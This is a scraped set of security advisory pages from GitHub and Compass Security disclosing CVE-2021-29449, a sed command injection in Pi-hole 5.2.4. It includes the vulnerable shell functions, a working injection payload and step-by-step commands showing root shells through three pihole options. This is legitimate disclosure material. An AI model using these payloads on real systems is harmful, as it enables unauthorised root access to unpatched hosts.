=== Content from packetstormsecurity.com_eac4fed0_20250114_184802.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_5990e726_20250114_184803.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fpi-hole%2Fsecurity%2Fadvisories%2FGHSA-3597-244c-wrpj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fpi-hole%2Fsecurity%2Fadvisories%2FGHSA-3597-244c-wrpj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=pi-hole%2Fpi-hole)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pi-hole](/pi-hole)
/
**[pi-hole](/pi-hole/pi-hole)**
Public

* [Notifications](/login?return_to=%2Fpi-hole%2Fpi-hole) You must be signed in to change notification settings
* [Fork
  2.7k](/login?return_to=%2Fpi-hole%2Fpi-hole)
* [Star
   49.9k](/login?return_to=%2Fpi-hole%2Fpi-hole)

* [Code](/pi-hole/pi-hole)
* [Issues
  32](/pi-hole/pi-hole/issues)
* [Pull requests
  5](/pi-hole/pi-hole/pulls)
* [Discussions](/pi-hole/pi-hole/discussions)
* [Actions](/pi-hole/pi-hole/actions)
* [Projects
  0](/pi-hole/pi-hole/projects)
* [Security](/pi-hole/pi-hole/security)
* [Insights](/pi-hole/pi-hole/pulse)

Additional navigation options

* [Code](/pi-hole/pi-hole)
* [Issues](/pi-hole/pi-hole/issues)
* [Pull requests](/pi-hole/pi-hole/pulls)
* [Discussions](/pi-hole/pi-hole/discussions)
* [Actions](/pi-hole/pi-hole/actions)
* [Projects](/pi-hole/pi-hole/projects)
* [Security](/pi-hole/pi-hole/security)
* [Insights](/pi-hole/pi-hole/pulse)

# Multiple Privilege Escalation Vulnerabilities Pihole

Moderate

[PromoFaux](/PromoFaux)
published
GHSA-3597-244c-wrpj
Apr 14, 2021

## Package

Pi-hole Core

## Affected versions

<=5.2.4

## Patched versions

5.3

## Description

Hello,

During a security assessment of the Pihole product, I found three privilege escalation vulnerabilities on the latest version: 5.2.4.

These vulnerabilities allow attackers with a low privilege shell to elevate their privileges to the root user.

In order to mitigate these vulnerabilities, a strict validation of the user’s input before being used in the sed command should be implemented.

Here the details of the 3 privilege escalation vulnerabilities I found:

## 1st Privilege Escalation

This exploit works only if the file /etc/dnsmasq.d/05-pihole-custom-cname.conf is not empty.

Showing that the current user is www-data (it is possible to use any other low-privilege user with the same sudo configuration as the www-data user):

```
$ whoami

www-data

```

The file 05-pihole-custom-cname.conf does not exist:

```
$ ls -l /etc/dnsmasq.d/05-pihole-custom-cname.conf

ls: cannot access '/etc/dnsmasq.d/05-pihole-custom-cname.conf': No such file or directory

```

Add a fake entry inside the file 05-pihole-custom-cname.conf:

```
$ sudo /usr/local/bin/pihole -a addcustomcname 'mydomain.com' 'mydomain.com'

  [✓] Adding custom CNAME record...

  [✓] Restarting DNS server

```

Check if the entry has been added to the file:

```
$ cat /etc/dnsmasq.d/05-pihole-custom-cname.conf

cname=mydomain.com,mydomain.com

```

Run the pihole script using the malicious payload to spawn a root shell:

```
$ sudo /usr/local/bin/pihole -a removecustomcname 'a/d ; 1e exec sh 1>&0 ; /'

  [✓] Removing custom CNAME record...

# id

uid=0(root) gid=0(root) groups=0(root)

```

The security issue resides in the RemoveCustomCNAMERecord function of the /opt/pihole/webpage.sh where the domain and target variables are taken from the input and not validated before being used in the sed command:

```
RemoveCustomCNAMERecord() {

    echo -e "  ${TICK} Removing custom CNAME record..."

    domain="${args[2]}"

    target="${args[3]}"

    sed -i "/cname=${domain},${target}/d" "${dnscustomcnamefile}"

    # Restart dnsmasq to update removed custom CNAME records

    RestartDNS

}

[CUT BY COMPASS]

main() {

    args=("$@")

    case "${args[1]}" in

[CUT BY COMPASS]

        "addcustomdns"        ) AddCustomDNSAddress;;

        "removecustomdns"     ) RemoveCustomDNSAddress;;

        "addcustomcname"      ) AddCustomCNAMERecord;;

        "removecustomcname"   ) RemoveCustomCNAMERecord;;

        *                     ) helpFunc;;

    esac

```

The payload a/d ; 1e exec sh 1>&0 ; / is used to add multiple sed expressions. One of the injected sed expressions (the red one) is used to spawn a new shell:

```
sed -i "/cname= a/d ; 1e exec sh 1>&0 ; /,/d" "${dnscustomcnamefile}"

```

---

## 2nd Privilege Escalation

The same vulnerability is present in the removecustomdns option. This exploit works only if the file /etc/pihole/custom.list is not empty.

Showing that the current user is www-data (it is possible to use any other low-privilege user with the same sudo configuration as the www-data user):

```
$ whoami

www-data

```

The file custom.list is empty:

```
$ ls -l /etc/pihole/custom.list

-rw-r--r-- 1 root root 0 Feb 23 05:38 /etc/pihole/custom.list

$ cat /etc/pihole/custom.list

```

Add a fake entry inside the file custom.list:

```
$ sudo /usr/local/bin/pihole -a addcustomdns '8.8.8.8' 'google.com'

  [✓] Adding custom DNS entry...

  [✓] Restarting DNS server

```

Check if the entry has been added to the file:

```
$ cat /etc/pihole/custom.list

8.8.8.8 google.com

```

Run the pihole script using the malicious payload to spawn a root shell:

```
$ sudo /usr/local/bin/pihole -a removecustomdns 'a/d ; 1e exec sh 1>&0 ; /'

  [✓] Removing custom DNS entry...

# id

uid=0(root) gid=0(root) groups=0(root)

```

The security issue resides in the RemoveCustomDNSAddress function of the /opt/pihole/webpage.sh where the IP and host variables are taken from the input and not validated before being used in the sed command:

```
RemoveCustomDNSAddress() {

    echo -e "  ${TICK} Removing custom DNS entry..."

    ip="${args[2]}"

    host="${args[3]}"

    sed -i "/${ip} ${host}/d" "${dnscustomfile}"

    # Restart dnsmasq to update removed custom DNS entries

    RestartDNS

}

[CUT BY COMPASS]

main() {

    args=("$@")

    case "${args[1]}" in

[CUT BY COMPASS]

        "addcustomdns"        ) AddCustomDNSAddress;;

        "removecustomdns"     ) RemoveCustomDNSAddress;;

        "addcustomcname"      ) AddCustomCNAMERecord;;

        "removecustomcname"   ) RemoveCustomCNAMERecord;;

        *                     ) helpFunc;;

    Esac

```
## 3rd Privilege Escalation

The same vulnerability is present in the removestaticdhcp option. This exploit works only if the file /etc/dnsmasq.d/04-pihole-static-dhcp.conf is not empty.

Showing that the current user is www-data (it is possible to use any other low-privilege user with the same sudo configuration as the www-data user):

```
$ whoami

www-data

```

The file 04-pihole-static-dhcp.conf does not exist:

```
$ ls -l /etc/dnsmasq.d/04-pihole-static-dhcp.conf

ls: cannot access '/etc/dnsmasq.d/04-pihole-static-dhcp.conf': No such file or directory

```

Add a fake entry inside the file 04-pihole-static-dhcp.conf:

```
$ sudo /usr/local/bin/pihole -a addstaticdhcp 'ff:ff:ff:ff:ff:ff' '10.10.10.10'

```

Check if the entry has been added to the file:

```
$ cat /etc/dnsmasq.d/04-pihole-static-dhcp.conf

dhcp-host=ff:ff:ff:ff:ff:ff,10.10.10.10,

```

Run the pihole script using the malicious payload to spawn a root shell:

```
$ sudo /usr/local/bin/pihole -a removestaticdhcp 'a/d ; 1e exec sh 1>&0 ; /'

# id

uid=0(root) gid=0(root) groups=0(root)

#

```

The security issue resides in the RemoveDHCPStaticAddress function of the /opt/pihole/webpage.sh where the mac variable is taken from the input and not validated before being used in the sed command:

```
RemoveDHCPStaticAddress() {

    mac="${args[2]}"

    sed -i "/dhcp-host=${mac}.*/d" "${dhcpstaticconfig}"

}

[CUT BY COMPASS]

main() {

    args=("$@")

    case "${args[1]}" in

[CUT BY COMPASS]

        "removestaticdhcp"    ) RemoveDHCPStaticAddress;;

[CUT BY COMPASS]

    esac

```

Please let me know if you have any questions.

Regards,

Emanuele Barbeno

### Severity

Moderate

### CVE ID

CVE-2021-29449

### Weaknesses

No CWEs

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.compass-security.com_e05f29c0_20250114_184803.html ===
#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
#############################################################
#
# Product: Pi-hole [1]
# Vendor: Pi-hole
# CSNC ID: CSNC-2021-008
# CVE ID: CVE-2021-29449
# Subject: Privilege Escalation
# Risk: High
# Effect: Locally exploitable
# Author: Emanuele Barbeno
# Date: 20.04.2021
#
#############################################################
Introduction
------------
Pi-hole is a Linux network-level advertisement and Internet tracker blocking
application which acts as a DNS sinkhole and optionally a DHCP server, intended
for use on a private network.
Input parameters used by the removecustomcname, the removecustomdns and the
removestaticdhcp functionalities of the pihole script are not validated and
directly used in the sed command allowing privilege escalation via command
injection. [2]
A local attacker can exploit this vulnerability to gain root privileges on
any system where a vulnerable Pi-hole version has been installed.
Affected
--------
Vulnerable:
\* Pi-hole v5.2.4
Not vulnerable:
\* Pi-hole v5.3
No other version was tested, but it is believed for the older versions to be
vulnerable as well.
Technical Description
---------------------
Three different functionalities are vulnerable [3]:
\* removecustomcname
\* removecustomdns
\* removestaticdhcp
----- Privilege Escalation removecustomcname Functionality -----
This exploit works only if the file 05-pihole-custom-cname.conf is not empty.
However, using the pihole script, it is possible to add custom entries in that
file.
Showing the current user:
```
$ whoami
www-data
```
The file 05-pihole-custom-cname.conf does not exist:
```
$ ls -l /etc/dnsmasq.d/05-pihole-custom-cname.conf
ls: cannot access '/etc/dnsmasq.d/05-pihole-custom-cname.conf': No such file
or directory
```
Adding a fake entry inside the file 05-pihole-custom-cname.conf using the
pihole script:
```
$ sudo /usr/local/bin/pihole -a addcustomcname 'mydomain.com' 'mydomain.com'
[✓] Adding custom CNAME record...
[✓] Restarting DNS server
```
Retrieve the content of the 05-pihole-custom-cname.conf to check if the file
is not empty:
```
$ cat /etc/dnsmasq.d/05-pihole-custom-cname.conf
cname=mydomain.com,mydomain.com
```
Spawn a root shell using the pihole script:
```
$ sudo /usr/local/bin/pihole -a removecustomcname 'a/d ; 1e exec sh 1>&0 ; /'
[✓] Removing custom CNAME record...
# id
uid=0(root) gid=0(root) groups=0(root)
```
The security issue resides in the RemoveCustomCNAMERecord function of the
/opt/pihole/webpage.sh script where the domain and target variables are taken
from the input and not validated before being used in the sed command:
```
RemoveCustomCNAMERecord() {
echo -e " ${TICK} Removing custom CNAME record..."
domain="${args[2]}"
target="${args[3]}"
sed -i "/cname=${domain},${target}/d" "${dnscustomcnamefile}"
# Restart dnsmasq to update removed custom CNAME records
RestartDNS
}
[CUT BY COMPASS]
main() {
args=("$@")
case "${args[1]}" in
[CUT BY COMPASS]
"addcustomdns" ) AddCustomDNSAddress;;
"removecustomdns" ) RemoveCustomDNSAddress;;
"addcustomcname" ) AddCustomCNAMERecord;;
"removecustomcname" ) RemoveCustomCNAMERecord;;
\* ) helpFunc;;
esac
```
The following is the sed command with the injected payload
(a/d ; 1e exec sh 1>&0 ; /):
```
sed -i "/cname= a/d ; 1e exec sh 1>&0 ; /,/d" "${dnscustomcnamefile}"
```
Now the sed command contains three different expressions separated by ';':
\* /cname= a/d
\* 1e exec sh 1>&0
\* /,/d
The second expression is used to spawn a new shell using the same privileges
of the user who is running the command which, in case of sudo, is root
----- Privilege Escalation removecustomdns Functionality -----
The same vulnerability is present in the removecustomdns functionality.
Showing the current user:
```
$ whoami
www-data
```
The file custom.list is empty:
```
$ ls -l /etc/pihole/custom.list
-rw-r--r-- 1 root root 0 Feb 23 05:38 /etc/pihole/custom.list
$ cat /etc/pihole/custom.list
```
Add a fake entry inside the custom.list file using the pihole script:
```
$ sudo /usr/local/bin/pihole -a addcustomdns '8.8.8.8' 'google.com'
[✓] Adding custom DNS entry...
[✓] Restarting DNS server
```
Check if the fake entry has been added to the file:
```
$ cat /etc/pihole/custom.list
8.8.8.8 google.com
```
Spawn a root shell using the pihole script:
```
$ sudo /usr/local/bin/pihole -a removecustomdns 'a/d ; 1e exec sh 1>&0 ; /'
[✓] Removing custom DNS entry...
# id
uid=0(root) gid=0(root) groups=0(root)
```
The security issue resides in the RemoveCustomDNSAddress function of the
/opt/pihole/webpage.sh script where the domain and target variables are taken
from the input and not validated before being used in the sed command:
```
RemoveCustomDNSAddress() {
echo -e " ${TICK} Removing custom DNS entry..."
ip="${args[2]}"
host="${args[3]}"
sed -i "/${ip} ${host}/d" "${dnscustomfile}"
# Restart dnsmasq to update removed custom DNS entries
RestartDNS
}
[CUT BY COMPASS]
main() {
args=("$@")
case "${args[1]}" in
[CUT BY COMPASS]
"addcustomdns" ) AddCustomDNSAddress;;
"removecustomdns" ) RemoveCustomDNSAddress;;
"addcustomcname" ) AddCustomCNAMERecord;;
"removecustomcname" ) RemoveCustomCNAMERecord;;
\* ) helpFunc;;
Esac
```
----- Privilege Escalation removestaticdhcp Functionality
The same vulnerability is present in the removestaticdhcp functionality.
Showing the current user:
```
$ whoami
www-data
```
The file 04-pihole-static-dhcp.conf does not exist:
```
$ ls -l /etc/dnsmasq.d/04-pihole-static-dhcp.conf
ls: cannot access '/etc/dnsmasq.d/04-pihole-static-dhcp.conf': No such
file or directory
```
Add a fake entry inside the 04-pihole-static-dhcp.conf file using the
pihole script:
```
$ sudo /usr/local/bin/pihole -a addstaticdhcp 'ff:ff:ff:ff:ff:ff' '10.10.10.10'
```
Check if the entry has been added to the file:
```
$ cat /etc/dnsmasq.d/04-pihole-static-dhcp.conf
dhcp-host=ff:ff:ff:ff:ff:ff,10.10.10.10,
```
Spawn a root shell using the pihole script:
```
$ sudo /usr/local/bin/pihole -a removestaticdhcp 'a/d ; 1e exec sh 1>&0 ; /'
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
The security issue resides in the RemoveDHCPStaticAddress function of the
/opt/pihole/webpage.sh script where the domain and target variables are taken
from the input and not validated before being used in the sed command:
```
RemoveDHCPStaticAddress() {
mac="${args[2]}"
sed -i "/dhcp-host=${mac}.\*/d" "${dhcpstaticconfig}"
}
[CUT BY COMPASS]
main() {
args=("$@")
case "${args[1]}" in
[CUT BY COMPASS]
"removestaticdhcp" ) RemoveDHCPStaticAddress;;
[CUT BY COMPASS]
esac
```
Workaround / Fix
----------------
Perform strict validation and escaping on the input provided by the user
and used to construct OS commands to avoid any kind of injection. [4]
As a Pi-hole user, update your installation to the latest version to
receive the fix.
Timeline
--------
2021-02-22: Discovery by Emanuele Barbeno
2021-02-23: Initial vendor notification
2021-03-03: Initial vendor response
2021-03-30: Assigned CVE-2021-29449
2021-04-14: Release of fixed Version / Patch
2021-04-20: Coordinated public disclosure date
References
----------
[1] https://pi-hole.net/
[2] https://cwe.mitre.org/data/definitions/78.html
[3] https://github.com/pi-hole/pi-hole/security/advisories/GHSA-3597-244c-wrpj
[4] https://cheatsheetseries.owasp.org/cheatsheets/OS\_Command\_Injection\_Defense\_Cheat\_Sheet.html
